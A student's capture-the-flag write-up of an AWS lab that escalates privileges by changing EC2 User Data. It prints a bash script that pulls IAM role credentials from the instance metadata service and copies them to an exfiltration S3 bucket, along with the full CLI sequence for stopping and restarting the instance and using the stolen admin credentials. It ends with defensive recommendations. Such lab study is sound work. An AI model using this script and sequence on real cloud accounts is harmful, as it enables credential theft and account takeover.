>SOLUTION:

To retrieve the flag, I performed the following steps:

>a.Review the lab scenario and Terraform outputs
I first reviewed the README instructions and Terraform outputs to understand the environment. The lab explained that the starting user was a limited IAM user named dev_user, and that there was a target EC2 instance with an AdministratorAccess IAM role attached.
####Using the Terraform outputs, I identified:
    1. Target EC2 instance ID
    2. Exfiltration S3 bucket
    3. Protected flag bucket
    4. AWS region
    5. dev_user credentials
I also confirmed my identity using the AWS CLI command:<aws sts get-caller-identity>
The output showed that I was authenticated as:<arn:aws:iam::574246332158:user/iam-privesc-ec2-jylej70w-dev-user>

>b. Enumerate the EC2 instance
Next, I used the AWS CLI to inspect the EC2 instances and identify the privileged target instance.
##: <aws ec2 describe-instances>
From the output, I identified the target EC2 instance: <i-05f70a8c7df34d746>
I also observed that the instance had an attached IAM instance profile and was running in a private subnet.

>c. Stop the EC2 instance
The README explained that the dev_user had permissions to stop and start the EC2 instance.So,I stopped the target EC2 instance using: <aws ec2 stop-instances --instance-ids i-05f70a8c7df34d746>
After verifying that the instance entered the stopped state, I prepared to modify the EC2 User Data.

>d. Modify the EC2 User Data
I created a malicious User Data script designed to retrieve the EC2 metadata credentials and upload them to the exfiltration S3 bucket.
The script used:
    #!/bin/bash
    TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

    ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/)

    curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE \
    > /tmp/creds.json

    aws s3 cp /tmp/creds.json s3://iam-privesc-ec2-jylej70w-exfil-bucket/creds.json
Result: # Retrieve EC2 metadata token
        # Retrieve IAM role name
        # Retrieve temporary credentials
        # Upload the credentials to the exfiltration S3 bucket
Then, I added the script as EC2 User Data.

>e. Restart the EC2 instance
After updating the User Data, I started the EC2 instance again: <aws ec2 start-instances --instance-ids i-05f70a8c7df34d746>
When the instance booted, the User Data script executed automatically.

>f. Retrieve the stolen credentials
I checked the exfiltration S3 bucket using :<aws s3 ls s3://iam-privesc-ec2-jylej70w-exfil-bucket>
Then, I downloaded the file : <aws s3 cp s3://iam-privesc-ec2-jylej70w-exfil-bucket/creds.json .>
The file contained temporary Administrator role credentials including:
    1. Access Key ID
    2. Secret Access Key
    3. Session Token

>g. Configure the admin credentials
I configured a new AWS CLI profile named adminrole using the stolen credentials:<aws configure --profile adminrole
I manually added the session token to the AWS credentials file.
To verify the escalation worked, I ran:<aws sts get-caller-identity --profile adminrole

The output showed:<assumed-role/iam-privesc-ec2-jylej70w-target-ec2-role
This confirmed successful privilege escalation.

>h. Retrieve the flag
Finally, I accessed the protected S3 bucket and downloaded the flag:<aws s3 cp s3://iam-privesc-ec2-jylej70w-secret-flag/flag.txt . --profile adminrole
Then viewed the contents:<cat flag.txt
The flag obtained was:
    <CG{us3r_d4t4_m0d1f1c4t10n_pr1v3sc_jylej70w}>

>REFLECTION:

#What was your approach?
My approach started with understanding the lab architecture and identifying the permissions available to the dev_user. I focused on the EC2 instance because the README mentioned it had a highly privileged IAM role attached. After discovering that the user could stop and modify the EC2 instance, I used EC2 User Data to execute a malicious script that extracted the IAM credentials and uploaded them to an S3 bucket. Once the credentials were obtained, I configured them locally and accessed the protected flag bucket.

#What was the biggest challenge?
The biggest challenge was understanding how EC2 User Data works and how temporary IAM role credentials are retrieved from the EC2 metadata service. Since I was new to privilege escalation labs, understanding the attack flow and why the User Data script worked was initially confusing.

#How did you overcome the challenges?
I carefully reviewed the lab instructions and researched how EC2 metadata and IAM roles interact. I also tested the AWS CLI commands step by step and verified each stage before moving forward. Breaking the process into smaller parts helped me understand the overall attack path.

#What led to the breakthrough?
The breakthrough happened when the credentials successfully appeared inside the exfiltration S3 bucket. Once I downloaded the creds.json file and configured the adminrole profile, I confirmed that the privilege escalation had worked because the AWS CLI output displayed an assumed Administrator role.

#On the blue side, how can the learning be used to properly defend important assets?
This lab demonstrated the risks of overly permissive EC2 permissions and insecure IAM configurations. To properly defend important assets:
a. Restrict permissions to stop, start, and modify EC2 User Data
b. Apply the principle of least privilege for IAM users and roles
c. Monitor EC2 User Data modifications using CloudTrail and alerts
d. Restrict access to the EC2 metadata service whenever possible
e. Avoid attaching AdministratorAccess policies directly to EC2 roles
f. Use security monitoring tools to detect unusual credential exfiltration activity
